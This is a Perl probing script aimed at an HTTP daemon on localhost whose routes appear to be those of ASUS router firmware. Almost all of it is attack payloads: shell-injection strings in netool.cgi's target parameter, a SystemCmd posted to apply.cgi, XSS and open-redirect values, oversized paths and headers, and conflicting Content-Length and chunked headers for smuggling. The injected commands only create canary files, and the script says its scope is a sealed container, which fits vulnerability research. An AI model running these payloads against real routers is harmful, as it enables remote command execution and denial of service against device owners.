#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;

my $host = '127.0.0.1';
my $port = 80;

sub uri_escape {
    my ($value) = @_;
    $value =~ s/([^A-Za-z0-9_.~-])/sprintf("%%%02X", ord($1))/eg;
    return $value;
}

sub exchange {
    my ($payload, $timeout) = @_;
    $timeout //= 4;
    my $sock = IO::Socket::INET->new(
        PeerAddr => $host, PeerPort => $port, Proto => 'tcp', Timeout => $timeout,
    ) or return '';
    $sock->autoflush(1);
    print {$sock} $payload;
    shutdown($sock, 1);
    my $response = '';
    while (length($response) < 131072) {
        my $block = '';
        my $count = sysread($sock, $block, 8192);
        last if !defined($count) || $count == 0;
        $response .= $block;
    }
    close($sock);
    return $response;
}

sub request {
    my ($method, $path, $body, $headers) = @_;
    $body //= '';
    $headers //= '';
    return "$method $path HTTP/1.1\r\nHost: 127.0.0.1\r\n" .
        $headers .
        (length($body) ? "Content-Length: " . length($body) . "\r\n" : '') .
        "Connection: close\r\n\r\n$body";
}

sub alive {
    return exchange(request('GET', '/Main_Login.asp'), 3) =~ /^HTTP\//;
}

sub summarize {
    my ($name, $payload) = @_;
    my $response = exchange($payload);
    my ($status) = $response =~ /\A([^\r\n]*)/;
    my @statuses = $response =~ /^(HTTP\/[^\r\n]*)/mg;
    my $body = $response;
    $body =~ s/^.*?\r\n\r\n//s;
    $body =~ s/[\r\n]+/\\n/g;
    $body = substr($body, 0, 360);
    printf(
        "case=%s bytes=%d status=%s status_count=%d handler_success=%s " .
        "auth_ok=%s alive=%s body=%s\n",
        $name, length($response), ($status // 'empty'), scalar(@statuses),
        $response =~ /"successful"\s*:/ ? 'yes' : 'no',
        $response =~ /"asus_auth"\s*:\s*"OK"/ ? 'yes' : 'no',
        alive() ? 'yes' : 'no', $body,
    );
    exit 20 unless alive();
}

die "httpd baseline is not alive\n" unless alive();
print "scope=localhost-only network-disabled container\n";
print "httpd_control_before=alive\n";

for my $route (
    '/QIS_default.cgi', '/page_default.cgi', '/cfg_onboarding.cgi',
    '/check_Auth.cgi', '/findasus.cgi', '/apply.cgi', '/applyapp.cgi',
    '/appGet.cgi', '/netool.cgi', '/upload.cgi',
    '/upload_server_ovpn_cert.cgi', '/caupload.cgi',
) {
    (my $name = $route) =~ s{^/}{route-};
    summarize($name, request('GET', $route));
}

for my $target (
    '127.0.0.1',
    '-f 127.0.0.1',
    'FRIDAYTARGET',
    '127.0.0.1;touch /tmp/FRIDAY_GSAX3000_NETOOL_SEMI',
    '$(touch /tmp/FRIDAY_GSAX3000_NETOOL_SUBST)',
    '`touch /tmp/FRIDAY_GSAX3000_NETOOL_TICK`',
    '%n%n%n',
) {
    my $query = join('&',
        'type=1', 'target=' . uri_escape($target), 'pcnt=1',
        'response=1', 'exec=1',
    );
    summarize('netool-' . uri_escape($target), request('GET', "/netool.cgi?$query"));
}

my $system_body = join('&',
    'current_page=Main_Analysis_Content.asp',
    'action_mode=%20Refresh%20',
    'SystemCmd=' . uri_escape('touch /tmp/FRIDAY_GSAX3000_SYSTEMCMD'),
);
summarize(
    'apply-systemcmd-canary',
    request('POST', '/apply.cgi', $system_body,
        "Content-Type: application/x-www-form-urlencoded\r\n"),
);

for my $value (
    'QIS_wizard.htm?flag=welcome',
    '//friday.invalid/path',
    'javascript:FRIDAY_XSS',
    "';FRIDAY_XSS;//",
    'A' x 128,
    'A' x 512,
    'A' x 4096,
) {
    summarize(
        'qis-flag-' . length($value),
        request('GET', '/QIS_default.cgi?flag=' . uri_escape($value)),
    );
    summarize(
        'page-url-' . length($value),
        request('GET', '/page_default.cgi?url=' . uri_escape($value)),
    );
}

for my $size (256, 1024, 4096, 16384, 65536) {
    summarize("host-$size", request('GET', '/Main_Login.asp', '', 'X-Fill: ' . ('A' x $size) . "\r\n"));
}
for my $size (1024, 4096, 16384, 65536) {
    summarize("path-$size", request('GET', '/' . ('A' x $size)));
}

summarize(
    'duplicate-content-length',
    "POST /QIS_default.cgi HTTP/1.1\r\nHost: 127.0.0.1\r\n" .
    "Content-Length: 0\r\nContent-Length: 65535\r\nConnection: close\r\n\r\n",
);
summarize(
    'negative-content-length',
    "POST /QIS_default.cgi HTTP/1.1\r\nHost: 127.0.0.1\r\n" .
    "Content-Length: -1\r\nConnection: close\r\n\r\n",
);
summarize(
    'u32-content-length',
    "POST /QIS_default.cgi HTTP/1.1\r\nHost: 127.0.0.1\r\n" .
    "Content-Length: 4294967295\r\nConnection: close\r\n\r\n",
);
summarize(
    'content-length-plus-chunked',
    "POST /QIS_default.cgi HTTP/1.1\r\nHost: 127.0.0.1\r\n" .
    "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n" .
    "Connection: close\r\n\r\n0\r\n\r\n",
);

print "httpd_control_after=" . (alive() ? 'alive' : 'dead') . "\n";
